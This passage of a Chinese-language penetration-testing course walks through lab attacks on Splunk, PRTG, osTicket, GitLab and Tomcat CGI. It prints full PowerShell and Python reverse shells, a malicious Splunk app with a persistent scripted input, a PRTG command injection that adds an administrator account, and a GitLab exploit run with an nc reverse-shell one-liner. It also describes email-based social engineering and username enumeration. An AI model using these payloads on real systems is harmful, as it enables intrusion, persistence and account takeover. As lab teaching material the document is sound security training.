+最新版本的 Splunk 会在安装过程中设置凭据。如果默认凭据无效，则应检查是否存在常见的弱密码，例如 admin 、 Welcome 、 Welcome1 、 Password123 等。
+
+我们可以通过 Nmap 快速服务扫描发现 Splunk。这里我们可以看到，Nmap 识别出了端口 8000 和 8089 上的 Splunkd httpd 服务，其中 8089 是 Splunk 管理端口，用于与 Splunk REST API 通信。
+
+```
+$ sudo nmap -sV 10.129.201.50
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 08:43 EDT
+Nmap scan report for 10.129.201.50
+Host is up (0.11s latency).
+Not shown: 991 closed ports
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8000/tcp open  ssl/http      Splunkd httpd
+8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
+8089/tcp open  ssl/http      Splunkd httpd
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.22 seconds
+```
+
+### 1.2 枚举
+
+Splunk Enterprise 试用版在 60 天后会自动转换为免费版，而免费版无需身份验证。系统管理员安装 Splunk 试用版进行测试的情况并不少见，但之后往往会忘记将其移除。这会导致试用版自动转换为没有任何身份验证机制的免费版，从而在环境中引入安全漏洞。一些组织可能由于预算限制而选择免费版，却并未充分了解缺少用户/角色管理所带来的后果。
+
+登录 Splunk（或访问 Splunk Free 实例）后，我们可以浏览数据、运行报告、创建仪表板、从 Splunkbase 库安装应用程序以及安装自定义应用程序。![1774685925538](images/AttackingCommonApplications/1774685925538.png)
+
+Splunk 提供多种执行代码的方式，例如服务端 Django 应用、REST 接口、脚本输入（scripted inputs）以及告警脚本。
+在 Splunk 服务器上实现远程代码执行最常用的方法，就是利用脚本输入。
+该功能原本用于让 Splunk 对接 API、文件服务器等需要自定义方式获取的数据来源，执行指定脚本，并将脚本的标准输出（STDOUT）作为日志输入给 Splunk。
+由于 Splunk 支持 Windows 和 Linux，因此脚本输入可以执行：
+Bash 脚本
+PowerShell 脚本
+Batch 脚本
+而且所有 Splunk 都自带 Python 环境，因此Python 脚本可以在任意 Splunk 系统上运行。最简单获取 RCE 的方式就是：创建一个脚本输入，让 Splunk 执行一段 Python 反弹 Shell。这部分内容会在下一节讲解。
+除了这些内置功能外，Splunk 历史上也出现过多个公开漏洞，比如可用于未授权访问 REST API 的 [SSRF 漏洞](https://www.exploit-db.com/exploits/40895)。截至目前，Splunk 共有[ 47 个 CVE 编号](https://www.cvedetails.com/vulnerability-list/vendor_id-10963/Splunk.html)。在渗透测试中对 Splunk 进行漏洞扫描时，往往会扫出大量无法实际利用的漏洞。这也正是理解如何滥用内置功能非常重要的原因。
+
+### 1.3攻击
+
+如前一节所述，我们可以通过创建自定义应用程序来运行 Python、Batch、Bash 或 PowerShell 脚本，从而在 Splunk 上实现远程代码执行。从 Nmap 发现扫描中，我们注意到目标是一台 Windows 服务器。由于 Splunk 已预装 Python，我们可以创建一个自定义 Splunk 应用程序，利用 Python 或 PowerShell 脚本实现远程代码执行。
+
+#### 1.3.1滥用内置功能
+
+我们可以使用这个 [Splunk 包](https://github.com/0xjpuff/reverse_shell_splunk)来辅助我们。该仓库的 bin 目录中包含 Python 和 PowerShell 的示例。让我们一步一步地来。
+
+为了实现这一目标，我们首先需要使用以下目录结构创建一个自定义 Splunk 应用程序。
+
+```bash
+$ tree splunk_shell/
+
+splunk_shell/
+├── bin
+└── default
+
+2 directories, 0 files
+```
+
+bin 目录将包含我们打算运行的所有脚本（在本例中是一个 PowerShell 反向 shell），而默认目录将包含我们的 inputs.conf 文件。我们的反向 shell 将是一个 PowerShell 单行命令。
+
+```bash
+#A simple and small reverse shell. Options and help removed to save space. 
+#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+[inputs.conf ](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf)文件告诉 Splunk 要运行哪个脚本以及其他条件。这里我们将应用程序设置为启用，并告诉 Splunk 每 10 秒运行一次脚本。间隔始终以秒为单位，并且只有在存在此设置的情况下，输入（脚本）才会运行。
+
+```bash
+$ cat inputs.conf 
+
+[script://./bin/rev.py]
+disabled = 0  
+interval = 10  
+sourcetype = shell 
+
+[script://.\bin\run.bat]
+disabled = 0
+sourcetype = shell
+interval = 10
+```
+
+我们需要 .bat 文件，它会在应用程序部署时运行并执行 PowerShell 单行命令。
+
+```bat
+@ECHO OFF
+PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
+Exit
+```
+
+文件创建完成后，我们可以创建 tarball 或 .spl 文件。
+
+```bash
+$ tar -cvzf updater.tar.gz splunk_shell/
+
+splunk_shell/
+splunk_shell/bin/
+splunk_shell/bin/rev.py
+splunk_shell/bin/run.bat
+splunk_shell/bin/run.ps1
+splunk_shell/default/
+splunk_shell/default/inputs.conf
+```
+
+下一步是选择 Install app from file 并上传应用程序。![1774686386545](images/AttackingCommonApplications/1774686386545.png)
+
+在上传恶意自定义应用程序之前，让我们使用 Netcat 或 socat 启动一个监听器。
+
+```bash
+$ sudo nc -lnvp 443
+
+listening on [any] 443 ...
+
+```
+
+在 Upload app 页面上，点击浏览，选择我们之前创建的 tarball，然后点击 Upload 。
+
+![1774686419507](images/AttackingCommonApplications/1774686419507.png)
+
+一旦我们上传应用程序，就会收到反向 shell，因为应用程序的状态将自动切换到 Enabled 。
+
+```
+$ sudo nc -lnvp 443
+
+listening on [any] 443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145
+
+
+PS C:\Windows\system32> whoami
+
+nt authority\system
+
+
+PS C:\Windows\system32> hostname
+
+APP03
+
+
+PS C:\Windows\system32>
+```
+
+在这种情况下，我们获得了 NT AUTHORTY\SYSTEM 的 shell。如果这是一次实际的评估，我们可以继续枚举目标注册表、内存或文件系统其他位置存储的凭据，以便在网络中进行横向移动。如果这是我们在域环境中的初始立足点，我们可以利用此访问权限开始枚举 Active Directory 域。
+
+如果是在 Linux 主机上操作，我们需要在创建 tar 包并上传自定义恶意应用程序之前，编辑 rev.py Python 脚本。其余步骤相同，我们会在 Netcat 监听器上建立反向 shell 连接，然后就可以开始攻击了。
+
+```python
+import sys,socket,os,pty
+
+ip="10.10.14.15"
+port="443"
+s=socket.socket()
+s.connect((ip,int(port)))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn('/bin/bash')
+
+```
+
+如果被攻破的 Splunk 主机是部署服务器，则很可能可以对任何安装了通用转发器 (Universal Forwarder) 的主机进行远程代码执行 (RCE)。要向其他主机推送反向 shell，必须将应用程序放置在被攻破主机的 $SPLUNK_HOME/etc/deployment-apps 目录中。在 Windows 系统较多的环境中，我们需要使用 PowerShell 反向 shell 创建一个应用程序，因为通用转发器不像 Splunk 服务器那样随 Python 一起安装。
+
+## 2. PRTG Network Monitor
+
+PRTG 网络监控器是一款无需代理的网络监控软件。它可用于监控带宽使用情况、正常运行时间，并从包括路由器、交换机、服务器等在内的各种主机收集统计信息。PRTG 的第一个版本于 2003 年发布。2015 年，PRTG 发布了免费版本，该版本限制最多可连接 100 个传感器，用于监控最多 20 台主机。它采用自动发现模式扫描网络区域并创建设备列表。创建列表后，它可以使用 ICMP、SNMP、WMI、NetFlow 等协议从检测到的设备收集更多信息。设备还可以通过 REST API 与该工具通信。该软件完全基于 AJAX 网站运行，但也提供适用于 Windows、Linux 和 macOS 的桌面应用程序。
+
+多年来，PRTG 共遭受了[ 26 个漏洞](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html)的攻击，这些漏洞均被分配了 CVE 编号。其中，只有四个漏洞拥有易于找到的公开 PoC（概念验证代码）：两个跨站脚本 (XSS) 漏洞、一个拒绝服务 (DoS) 漏洞和一个需要认证的命令注入漏洞（我们将在本节中进行介绍）。PRTG 很少在外部暴露，但我们在内部渗透测试中经常遇到它
+
+我们可以通过 Nmap 扫描快速发现 PRTG。它通常运行在常见的 Web 端口上，例如 80、443 或 8080。以管理员身份登录后，可以在“设置”部分更改 Web 界面端口。
+
+```bash
+$ sudo nmap -sV -p- --open -T4 10.129.201.50
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
+Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 0.06% done
+Nmap scan report for 10.129.201.50
+Host is up (0.11s latency).
+Not shown: 65492 closed ports, 24 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8000/tcp  open  ssl/http      Splunkd httpd
+8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
+8089/tcp  open  ssl/http      Splunkd httpd
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds
+```
+
+从上面的 Nmap 扫描结果可以看出，在 8080 端口检测到了服务 Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) 。
+
+PRTG 也出现在我们之前执行的 EyeWitness 扫描中。我们可以看到 EyeWitness 列出了默认凭据 prtgadmin:prtgadmin 。这些凭据通常会预先填充在登录页面上，而且我们经常发现它们没有被更改。Nessus 等漏洞扫描器也提供了可以检测 PRTG 存在的[插件](https://www.tenable.com/plugins/nessus/51874) 。![1774687838371](images/AttackingCommonApplications/1774687838371.png)
+
+一旦我们发现了 PRTG，就可以通过浏览 URL 来确认，并会看到登录页面。![1774687857757](images/AttackingCommonApplications/1774687857757.png)
+
+根据我们目前进行的枚举，PRTG 版本似乎是 17.3.33.2830 ，并且可能存在 CVE-2018-9276 漏洞。该漏洞利用了 PRTG 网络监控器 18.2.39 版本之前的 PRTG 系统管理员 Web 控制台中的身份验证命令注入漏洞。根据 Nmap 报告的版本信息，我们可以推断当前版本存在漏洞。使用 cURL 可以确认版本号确实是 17.3.33.283 。
+
+我们第一次尝试使用默认凭据登录失败，但几次尝试后，我们使用 prtgadmin:Password123![1774687883350](images/AttackingCommonApplications/1774687883350.png)
+
+### 2.3利用已知漏洞攻击
+
+登录后，我们可以进行一些探索，但我们知道这很可能存在命令注入漏洞，所以我们直接进入正题。发现此漏洞的作者撰写了一篇精彩的[博文](https://www.codewatch.org/blog/?p=453)， 详细介绍了最初的发现过程以及他们是如何发现这个漏洞的。在创建新通知时， Parameter 字段会直接传递给 PowerShell 脚本，而没有任何输入清理措施。
+
+首先，将鼠标悬停在右上角的 Setup 上，然后选择 Account Settings 菜单，最后点击 Notifications 。![1774687976675](images/AttackingCommonApplications/1774687976675.png)
+
+接下来，点击 Add new notification 。![1774687986595](images/AttackingCommonApplications/1774687986595.png)
+
+给这条通知设置一个名称
+向下滚动页面，勾选 EXECUTE PROGRAM 选项
+在 Program File 下拉菜单中选择：Demo exe notification - outfile.ps1
+在参数（parameter）输入框中填入命令：
+
+```
+test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+```
+
+添加一个新的本地管理员用户。在实际评估过程中，我们可能需要执行一些不会更改系统的操作，例如获取反向 shell 或连接到我们常用的 C2 服务器。最后，单击 Save 按钮。![1774688140172](images/AttackingCommonApplications/1774688140172.png)
+
+点击 Save 后，我们将被重定向到 Notifications 页面，并在列表中看到名为 pwn 的新通知。![1774688156126](images/AttackingCommonApplications/1774688156126.png)
+
+现在，我们在设置通知时，**可以将其配置为在后续某个时间自动运行**（并执行我们的命令）。
+在长期渗透任务中，这一特性可以作为一种**持久化机制**，非常实用，值得留意。
+如果我们希望它每天在特定时间运行，以维持反弹连接或实现类似目的，可以在账户设置菜单中修改执行计划。
+
+至此，剩下的操作只需点击 **Test** 按钮，运行该通知并执行添加本地管理员用户的命令即可。
+点击 Test 后，会弹出提示：**EXE notification is queued up**（可执行程序通知已排队等待执行）。
+如果此处出现任何类型的错误提示，我们可以返回并仔细检查通知的相关配置。
+
+由于这是盲执行命令，我们不会收到任何反馈，因此我们需要检查监听器是否有连接，或者，在本例中，检查我们是否可以以本地管理员身份对主机进行身份验证。我们可以使用 CrackMapExec 来确认本地管理员权限。我们还可以尝试通过 RDP 连接到目标主机，通过 WinRM 访问，或者使用 [evil-winrm ](https://github.com/Hackplayers/evil-winrm)之类的工具，或者使用[ impacket ](https://github.com/SecureAuthCorp/impacket)工具包中的 wmiexec.py 或 psexec.py 等工具。
+
+```bash
+$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
+
+SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
+SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
+```
+
+我们已确认目标系统拥有本地管理员权限！请按照示例操作，并在目标系统上自行复现所有步骤。挑战一下自己，尝试利用命令注入漏洞从目标系统获取反向 shell 连接。
+
+# 六.客户服务与配置管理
+
+## 1. osTicket发现与枚举
+
+[osTicket ](https://osticket.com/)是一款开源的支持工单系统，可与 Jira、OTRS、Request Tracker 和 Spiceworks 等系统相媲美。osTicket 可以将用户通过电子邮件、电话和网页表单提交的咨询整合到一个统一的 Web 界面中。osTicket 使用 PHP 编写，并采用 MySQL 后端数据库，可安装在 Windows 或 Linux 系统上。虽然目前关于 osTicket 的市场信息并不多，但通过 Google 搜索 Helpdesk software - powered by osTicket 可以找到约 44,000 条结果，其中许多似乎是使用该应用程序的公司、学校系统、大学、地方政府等。
+
+回顾我们之前进行的 EyeWitness 扫描，我们注意到 osTicket 实例的屏幕截图，其中还显示访问该页面时设置了一个名为 OSTSESSID 的 cookie。![1774707140796](images/AttackingCommonApplications/1774707140796.png)
+
+此外，大多数 osTicket 安装包都会在页面底部显示 osTicket 徽标，徽标前会显示 powered by 字样。底部可能还会包含 Support Ticket System 字样。![1774707173782](images/AttackingCommonApplications/1774707173782.png)
+
+Nmap 扫描只会显示有关 Web 服务器（例如 Apache 或 IIS）的信息，而无法帮助我们了解应用程序的情况。osTicket 是一个维护和服务完善的 Web 应用程序。纵观过去几十年发现的 CVE ，我们几乎找不到 osTicket 可能存在的漏洞和攻击手段。这恰恰说明了理解 Web 应用程序工作原理的重要性。即使应用程序本身不存在漏洞，它仍然可以用于我们的目的。我们可以将主要功能分解为以下几层：![1774707280229](images/AttackingCommonApplications/1774707280229.png)
+
+osTicket 的核心功能是通知公司员工某个问题，以便他们能够利用服务或其他组件解决问题。该应用的一大优势在于它是开源的。因此，我们可以找到大量的教程和示例，以便更深入地了解该应用。例如，从 osTicket 的文档中我们可以看到，只有员工和拥有管理员权限的用户才能访问管理面板。所以，如果我们的目标公司使用这款应用或类似的应用，我们可以制造问题，然后“装傻充愣”，联系公司员工。这种模拟对公司提供的服务“一无所知”并结合技术问题的做法，是一种常见的社会工程学手段，旨在从公司获取更多信息。
+
+作为员工或管理员，他们会尝试重现重大错误，以找到问题的根源。最终的处理工作会在内部隔离环境中完成，该环境的设置与生产系统非常相似。假设员工和管理员怀疑存在可能影响业务的内部漏洞，那么他们会深入调查，找出可能的代码错误并解决更严重的问题。
+
+根据问题的严重程度，很可能技术部门的其他员工也会参与到邮件往来中。这将使我们获得新的电子邮件地址，用于攻击 osTicket 管理面板（最坏情况下），以及潜在的用户名，我们可以利用这些用户名进行开源情报搜集，或者尝试将其应用于公司的其他服务。
+
+### 1.2 攻击
+
+在 exploit-db 上搜索 osTicket 会发现各种问题，包括远程文件包含、SQL 注入、任意文件上传、XSS 等。osTicket 1.14.1 版本存在[ CVE-2020-24881 ](https://nvd.nist.gov/vuln/detail/CVE-2020-24881)漏洞，该漏洞为 SSRF 漏洞。如果被利用，此类漏洞可能被用于访问内部资源或执行内部端口扫描。
+
+让我们来看一个简单的例子，这与这篇优秀的博客文章有关， @ippsec 也提到这篇文章启发了他创作 Box Delivery，我强烈建议大家在阅读完本节后去看看这篇文章。
+
+假设我们发现了一个对外暴露的服务，比如某公司的 Slack 服务器或 GitLab，这类服务需要使用有效的公司邮箱才能注册加入。许多公司都会设有支持邮箱，例如 support@inlanefreight.local，发送到该邮箱的邮件会展示在在线支持门户中 —— 这类门户可能是 Zendesk 这类第三方平台，也可能是企业内部自研的工具。此外，支持门户在创建新工单时，通常会为该工单分配一个临时内部邮箱地址，方便用户快速查看工单处理状态。
+如果在渗透测试过程中，我们发现了客户支持门户，并且可以提交新工单，就有可能获取到一个有效的公司内部邮箱地址。
+
+![1774708768543](images/AttackingCommonApplications/1774708768543.png)
+
+登录后，我们可以查看工单相关信息以及回复工单的入口。如果该公司的帮助台软件配置为将工单号与邮箱关联绑定，那么任何发送到我们创建工单时获得的邮箱（如 940288@inlanefreight.local）的邮件，都会显示在这个工单页面内。借助这种配置方式，一旦我们找到对外暴露的外部平台，比如维基系统、聊天服务（Slack、Mattermost、Rocket.chat）或 Git 仓库（GitLab、Bitbucket），就可以用这个邮箱注册账号，并通过帮助台支持门户接收注册确认邮件，完成验证。![1774708815461](images/AttackingCommonApplications/1774708815461.png)
+
+## 2.GitLab - 发现与枚举
+
+[GitLab ](https://about.gitlab.com/)是一款基于 Web 的 Git 代码仓库托管工具，提供 wiki 功能、问题跟踪以及持续集成和部署流水线功能。它是开源的，最初使用 Ruby 编写，但目前的技术栈包括 Go、Ruby on Rails 和 Vue.js。GitLab 于 2014 年首次发布，经过多年的发展，如今已成长为一家拥有 1400 名员工、2020 年收入达 1.5 亿美元的公司。虽然该应用程序是免费开源的，但他们也提供付费的企业版。
+
+GitLab 与 GitHub 和 BitBucket 类似，它们也是基于 Web 的 Git 代码仓库工具。三者之间的比较可以[在这里](https://stackshare.io/stackups/bitbucket-vs-github-vs-gitlab)查看。
+
+在内部和外部渗透测试中，我们经常会在公司的 GitHub 代码库或自托管的 GitLab 或 BitBucket 实例中发现一些有趣的数据。这些 Git 代码库可能只包含公开可用的代码，例如与 API 交互的脚本。但是，我们也可能发现一些意外提交的脚本或配置文件，其中包含我们可以利用的明文密钥，例如密码。我们还可能找到 SSH 私钥。我们可以尝试使用搜索功能来查找用户、密码等信息。像 GitLab 这样的应用程序允许创建公共代码库（无需身份验证）、内部代码库（仅限已验证用户访问）和私有代码库（仅限特定用户访问）。仔细查看任何公共代码库中的敏感数据也很有价值，如果应用程序允许，可以注册一个帐户，看看是否有任何有趣的内部代码库可以访问。大多数公司只允许拥有公司电子邮件地址的用户注册，并要求管理员授权帐户，但正如我们稍后将看到的，可以设置 GitLab 实例，允许任何人注册并登录。
+
+如果我们能从开源情报（OSINT）中获取用户凭据，或许就能登录 GitLab 实例。默认情况下，双因素身份验证处于禁用状态。
+
+我们只需浏览 GitLab URL 即可快速确定某个环境中是否正在使用 GitLab，我们会被引导至登录页面，该页面会显示 GitLab 徽标。![1774709784356](images/AttackingCommonApplications/1774709784356.png)
+
+唯一能获取 GitLab 当前版本号的方法是登录后访问 /help 页面。如果 GitLab 实例允许我们注册账号，我们可以登录并访问此页面来确认版本。如果无法注册账号，我们可能需要尝试一些风险较低的漏洞利用方法，例如[这个 ](https://www.exploit-db.com/exploits/49821)。我们不建议对同一个应用程序发起多种漏洞利用攻击，因此，如果我们无法获取版本号（例如页面上的日期、首次公开提交或通过注册用户），那么我们应该专注于寻找安全漏洞，而不是盲目地尝试多种漏洞利用方法。过去几年中 ， GitLab [12.9.0](https://www.exploit-db.com/exploits/48431) 、GitLab [11.4.7 ](https://www.exploit-db.com/exploits/49257)以及 GitLab 社区版 [13.10.3](https://www.exploit-db.com/exploits/49821)、[13.9.3 ](https://www.exploit-db.com/exploits/49944)和 [13.10.2](https://www.exploit-db.com/exploits/49951) 都曾遭受过一些严重的漏洞攻击。
+
+### 2.1 枚举
+
+在不知道版本号或未登录的情况下，我们对 GitLab 能做的非常有限。首先，我们应该尝试浏览 `/explore `页面，看看是否有任何公开项目可能包含有价值的信息。浏览到该页面后，我们看到了一个名为 Inlanefreight dev 项目。公开项目之所以有用，是因为我们可以利用它们来了解更多关于公司基础设施的信息，找到生产代码并在代码审查后发现 bug，找到硬编码的凭据、包含凭据的脚本或配置文件，或其他机密信息，例如 SSH 私钥或 API 密钥。![1774710023579](images/AttackingCommonApplications/1774710023579.png)
+
+浏览该项目后发现，它看起来像是一个示例项目，可能不包含任何有用的东西，但总是值得深入挖掘一下。
+
+![1774710036023](images/AttackingCommonApplications/1774710036023.png)
+
+从这里，我们可以浏览左上角 groups 、 snippets 和 help 链接中的每个页面。我们还可以使用搜索功能，看看能否发现其他项目。在探索完外部资源后，我们应该检查是否可以注册账号并访问更多项目。假设该组织设置 GitLab 时并未仅允许使用公司邮箱注册，或者要求管理员批准新账号。在这种情况下，我们或许能够访问更多数据。![1774710065945](images/AttackingCommonApplications/1774710065945.png)
+
+我们还可以通过注册表单枚举有效的用户账号（下一节会详细讲解这部分内容）。如果能整理出一份有效用户名单，就可以尝试猜测弱口令，或是像 osTicket 章节中那样，使用 Dehashed 这类工具，从密码泄露库中查找可复用的账号密码。在当前界面中，我们能看到 root 这个用户名已被占用。下一节我们还会看到另一个用户名枚举的实例。
+
+在这个特定的 GitLab 实例（以及其他多数版本）中，我们还能枚举邮箱地址。如果我们用一个已被注册过的邮箱尝试注册，系统会抛出错误：1 error prohibited this user from being saved: Email has already been taken（1 项错误阻止该用户创建：邮箱已被占用）
+截至本文撰写时，这种用户名枚举方法在最新版 GitLab 中依然有效。即便管理员在设置页面的「注册限制」中关闭了「允许注册」选项，我们依旧可以访问 ` /users/sign_up` 注册页面枚举用户，只是无法完成最终注册而已。
+
+可以采取一些缓解措施，例如对所有用户帐户强制执行双因素身份验证，使用 Fail2Ban 阻止表明暴力破解攻击的失败登录尝试，甚至限制哪些 IP 地址可以访问 GitLab 实例（如果必须在内部企业网络之外访问）。![1774710199903](images/AttackingCommonApplications/1774710199903.png)
+
+让我们使用 hacker:Welcome 账号注册并登录，然后四处探索一番。注册完成后，我们立即登录并进入项目仪表盘页面。现在访问 /explore 页面，我们会发现 Inlanefreight website 已经上线。稍加研究，发现这只是一个公司的静态网站。假设这是一个其他类型的应用程序（例如 PHP），那么我们就可以下载源代码，检查是否存在漏洞或隐藏功能，或者找到凭据或其他敏感数据。
+
+在现实场景中，如果我们能够注册并获得对其任何代码仓库的访问权限，就有可能找到大量敏感数据。正如这篇[博文](https://tillsongalloway.com/finding-sensitive-information-on-github/index.html)所述，我们可以在 GitLab、GitHub 等平台上发现大量数据。
+
+### 2.2 攻击
+
+正如我们在上一节中看到的，即使是未经身份验证的 GitLab 实例访问也可能导致敏感数据泄露。如果我们能够以合法公司用户或管理员的身份获得访问权限，我们或许能够获取足够的数据，从而在某种程度上彻底攻破整个组织。截至 2021 年 9 月，GitLab 已报告了 [553 个 CVE 漏洞](https://www.cvedetails.com/vulnerability-list/vendor_id-13074/Gitlab.html)。 虽然并非每个漏洞都可被利用，但多年来确实存在一些严重的漏洞，可能导致远程代码执行。
+
+#### 2.2.1 用户名枚举
+
+尽管在 GitLab 的 HackerOne 漏洞平台上，官方并不将用户枚举视为漏洞（官方说明：“除非能证明存在额外危害，否则用户 / 项目枚举、路径泄露不属于漏洞”），但这项技巧依然值得测试 —— 如果用户设置了弱口令，我们就能通过枚举的账号成功登录系统。我们当然可以手动测试，但使用脚本会大幅提升效率。我们可以用 Bash 或 Python 自行编写脚本，也可以使用现成工具批量枚举有效用户列表，该工具的 Python3 版本可以在这里找到。和所有密码喷洒攻击一样，我们必须警惕账号锁定和其他干扰情况。在16.6 以下版本的 GitLab 中，默认规则为：登录失败 10 次后锁定账号，10 分钟后自动解锁。在此之前，修改这些安全配置需要从源码编译 GitLab，因为管理员后台没有提供修改选项。从16.6 版本开始，管理员可以直接在后台 UI 界面配置这些参数：通过 max_login_attempts 设置锁定前的最大登录次数，通过 failed_login_attempts_unlock_period_in_minutes 设置自动解锁时间。相关配置入口可以在这里找到。如果管理员未手动修改这些配置，默认规则依旧是失败 10 次锁定，10 分钟解锁。此外，虽然管理员可以修改最小密码长度来强制用户设置更复杂的密码，但仅靠这一项设置，无法完全抵御密码攻击风险。
+
+#### 2.2.2 远程代码执行
+
+远程代码执行漏洞通常被认为是“最棘手的漏洞”，因为一旦获得底层服务器的访问权限，我们很可能就能访问服务器上的所有数据（尽管我们可能需要先提升权限），并且可以以此为跳板入侵网络，对其他系统发起进一步攻击，甚至可能导致整个网络被攻陷。GitLab 社区版 13.10.2 及更低版本存在一个[经过身份验证的远程代码执行漏洞](https://hackerone.com/reports/1154542) ，该漏洞是由于 ExifTool 处理上传图像文件中的元数据时存在问题造成的。GitLab 已迅速修复了此问题，但一些公司可能仍在继续使用存在漏洞的版本。我们可以利用此[漏洞利用](https://www.exploit-db.com/exploits/49951)实现远程代码执行。
+
+由于这是经过身份验证的远程代码执行，我们首先需要有效的用户名和密码。在某些情况下，只有通过开源情报（OSINT）或凭据猜测攻击获取有效凭据才能成功。但是，如果我们遇到允许自助注册的易受攻击的 GitLab 版本，我们可以快速注册一个帐户并实施攻击。
+
+```bash
+$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+
+[1] Authenticating
+Successfully Authenticated
+[2] Creating Payload 
+[3] Creating Snippet and Uploading
+[+] RCE Triggered !!
+```
+
+我们几乎立刻就拿到了shell。
+
+```bash
+$ nc -lnvp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054
+
+git@app04:~/gitlab-workhorse$ id
+
+id
+uid=996(git) gid=997(git) groups=997(git)
+
+git@app04:~/gitlab-workhorse$ ls
+
+ls
+VERSION
+config.toml
+flag_gitlab.txt
+sockets
+```
+
+# 七.通用网关接口
+
+## 1.攻击 Tomcat CGI
+
+CVE-2019-0232 是一个严重的安全漏洞，可能导致远程代码执行。该漏洞影响启用了 enableCmdLineArguments 功能的 Windows 系统。攻击者可以利用 Tomcat CGI Servlet 输入验证错误导致的命令注入漏洞，从而在受影响的系统上执行任意命令。受影响的 Tomcat 版本 7.0.93 9.0.0.M1 至 9.0.17 至 8.5.0 以及 8.5.39 至 7.0.0 。
+
+CGI Servlet 是 Apache Tomcat 的一个关键组件，它使 Web 服务器能够与 Tomcat JVM 之外的外部应用程序进行通信。这些外部应用程序通常是用 Perl、Python 或 Bash 等语言编写的 CGI 脚本。CGI Servlet 接收来自 Web 浏览器的请求，并将其转发给 CGI 脚本进行处理。
+
+本质上，CGI Servlet 是一个运行在 Web 服务器（例如 Apache2）上的程序，用于支持符合 CGI 规范的外部应用程序的执行。它是 Web 服务器和外部信息资源（例如数据库）之间的中间件。
+
+CGI 脚本在网站中被广泛使用有诸多原因，但使用它们也存在一些非常显著的缺点：
+
+|                           优点                           |                       缺点                       |
+| :------------------------------------------------------: | :----------------------------------------------: |
+|              用于生成动态网页内容简单且高效              | 每个请求都需要将程序加载到内存，产生额外性能开销 |
+| 可使用**任意编程语言**编写（只要支持标准输入输出） |    不同页面请求之间，无法在内存中轻松缓存数据    |
+|               可复用现有代码，无需重新编写               |        会降低服务器性能，消耗大量处理资源        |
+
+Apache Tomcat 的 CGI Servlet 中有一个配置项 **`enableCmdLineArguments`**，它用于控制**是否将 URL 中的查询参数转换为命令行参数**。
+
+如果该配置设置为 **`true`**，Tomcat 的 CGI 处理器会自动解析 URL 后的参数，并将其直接作为**命令行参数**传递给 CGI 脚本。
+
+该功能让 CGI 脚本更灵活，无需通过环境变量 / 标准输入传递参数。例如，CGI 脚本可以根据用户传入的命令行参数，执行不同的操作。
+
+举个例子：假设你有一个 CGI 脚本，用于在书店目录中搜索书籍，脚本支持两种功能：`按标题搜索` 和 `按作者搜索`。
